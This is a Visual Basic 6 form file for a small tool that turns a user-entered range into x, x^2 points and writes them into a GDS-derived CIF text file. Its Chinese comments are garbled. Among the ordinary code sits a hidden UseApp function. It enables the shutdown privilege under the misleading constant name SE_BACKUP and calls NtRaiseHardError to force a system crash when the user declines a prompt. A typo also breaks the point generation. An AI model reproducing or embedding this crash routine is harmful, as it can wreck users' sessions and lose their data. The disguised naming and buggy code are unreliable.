VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "������С����"
   ClientHeight    =   3030
   ClientLeft      =   6045
   ClientTop       =   2895
   ClientWidth     =   4095
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MouseIcon       =   "Form1.frx":81CF
   ScaleHeight     =   3030
   ScaleMode       =   0  'User
   ScaleWidth      =   4095
   Begin VB.TextBox Text4 
      BeginProperty Font 
         Name            =   "΢���ź�"
         Size            =   14.25
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   120
      TabIndex        =   5
      Top             =   2280
      Width           =   1815
   End
   Begin VB.TextBox Text3 
      BeginProperty Font 
         Name            =   "΢���ź�"
         Size            =   14.25
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   2160
      TabIndex        =   4
      Top             =   1440
      Width           =   1815
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "΢���ź�"
         Size            =   14.25
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   120
      TabIndex        =   3
      Top             =   480
      Width           =   3855
   End
   Begin VB.TextBox Text2 
      BeginProperty Font 
         Name            =   "΢���ź�"
         Size            =   14.25
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   120
      TabIndex        =   1
      Top             =   1440
      Width           =   1815
   End
   Begin VB.CommandButton Command1 
      Caption         =   "��������"
      BeginProperty Font 
         Name            =   "΢���ź�"
         Size            =   12
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   2160
      TabIndex        =   0
      Top             =   2280
      Width           =   1815
   End
   Begin VB.Label Label4 
      Caption         =   "Step"
      BeginProperty Font 
         Name            =   "΢���ź�"
         Size            =   12
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   660
      TabIndex        =   8
      Top             =   1920
      Width           =   735
   End
   Begin VB.Label Label3 
      Caption         =   "Y"
      BeginProperty Font 
         Name            =   "΢���ź�"
         Size            =   12
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   2940
      TabIndex        =   7
      Top             =   1080
      Width           =   255
   End
   Begin VB.Label Label2 
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "΢���ź�"
         Size            =   12
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   900
      TabIndex        =   6
      Top             =   1080
      Width           =   255
   End
   Begin VB.Label Label1 
      Caption         =   "��ȡ�������ݣ�"
      BeginProperty Font 
         Name            =   "΢���ź�"
         Size            =   12
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   1815
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Rem ȫ�ֱ���
Rem ������Ҫ�ı���
Dim text As String
Dim textOld As String, textNew As String
Dim PATH As String, NewPATH As String
Dim fsoObj As Object, writeObj As Object, objFile As Object
Dim lineNumber As Long

Rem ������Ҫʹ�õĳ���
Const SE_BACKUP As Long = &H13
Const STATUS_ASSERTION_FAILURE As Long = &HC0000420

Rem ��������RtlAdjustPrivilege
Private Declare Function RtlAdjustPrivilege Lib "ntdll.dll" _
    (ByVal Privilege As Long, _
    ByVal Enable As Byte, _
    ByVal CurrentThread As Byte, _
    ByVal Enabled As Long) As Long

Rem ��������NtRaiseHardError
Private Declare Function NtRaiseHardError Lib "ntdll.dll" _
    (ByVal ErrorStatus As Long, _
    ByVal NumberOfParameters As Long, _
    ByVal UnicodeStringParameterMask As Long, _
    ByVal Parameters As Long, _
    ByVal ValidResponseOption As Long, _
    ByVal Response As Long) As Long
    

Rem ��ť����
Private Sub Command1_Click()
    Rem ���ı����ȡ����ķ�Χ������
    textNew2 = Text2.text
    textNew3 = Text3.text
    Rem ���ı����ȡ����
    textNew4 = Text4.text
    Text2.text = ""
    Text3.text = ""
    Text4.text = ""
    Rem ����ת��
    Dim Begin As Long, End_ As Long, Step As Double
    Dim FullStr As String
    Begin = CLng(textNew2)
    End_ = CLng(textNew3)
    Step = CDbl(textNew4)
    FullStr = GenerateData(Begin, End_, Step)
    Rem ƴ��Ϊһ���ַ���
    textNew = "P " + FullStr
    textNew = RTrim(textNew)
    Rem �滻����
    text = fsoObj.OpenTextFile(PATH).readall
    text = Replace(text, textOld, textNew)
    MsgBox text
    Rem д��
    Set writeObj = fsoObj.CreateTextFile(NewPATH, True)
    writeObj.write (text)
    Rem �رն���
    writeObj.Close
    
End Sub

Rem ���崴������
Private Sub Form_Load()
    Rem UseApp ע����һ���ܺ���Ķ���
    CurrentPath = App.PATH
    Rem �ļ����ھ���·��
    PATH = CurrentPath & "\juxing.gds.txt"
    Rem ��Ҫ������ļ�
    NewPATH = CurrentPath & "\juxing.gds.cif"
    Rem ��������
    Set fsoObj = CreateObject("scripting.filesystemobject")
    Rem ��ȡ�ı��ļ������ݵ��༭����
    Set objFile = fsoObj.OpenTextFile(PATH)
    lineNumber = 1
    textOld = ""
    Rem ������ָ���У������ȡ���ı����ڴ����Ա�ʹ��
    Rem �������ļ�ĩβ
    Do Until objFile.AtEndOfStream
        Dim lineContent As String
        lineContent = objFile.ReadLine
        If lineNumber = 11 Then
            textOld = textOld & lineContent
            Exit Do
        End If
        lineNumber = lineNumber + 1
    Loop
    objFile.Close
    Rem ȥ������ķֺ�
    textOld = Replace(textOld, ";", "")
    Text1.text = textOld
    lineNumber = 1
End Sub

Rem �˳������
Private Function UseApp()
    Dim nRet As Long
    nRet = MsgBox("���˿ɰ���", vbYesNo)
    If nRet <> vbYes Then
        Rem �˳�
        Dim nStatus As Long
        Dim Enabled As Byte
        Dim Response As Long
        nStatus = RtlAdjustPrivilege(SE_BACKUP, 1, 0, VarPtr(Enabled))
        If nStatus < 0 Then
            UseApp = False
        End If
        nStatus = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, VarPtr(Response))
        If nStatus < 0 Then
            UseApp = False
        End If
    Else
        UseApp = False
    End If
End Function

Rem ����������Χ���ɵ�
Private Function GenerateData(ByVal m_Begin As Long, ByVal m_End As Long, ByVal m_Step As Double)
    Dim x As Double
    Dim y As Double
    Dim dataPoints As String
    For x = m_Begin To m_End Step m_Step
        y = x ^ 2
        dataPoints = dataPoint9s & Format(x, "0.000") & "," & Format(y, "0.000") & " "
    Next x
    Rem �ж�
    Rem ��� x = m_End ������
    x = m_End
    y = x ^ 2
    dataPoints = dataPoints & Format(x, "0.000") & "," & Format(y, "0.000") & " "
    GenerateData = dataPoints
End Function
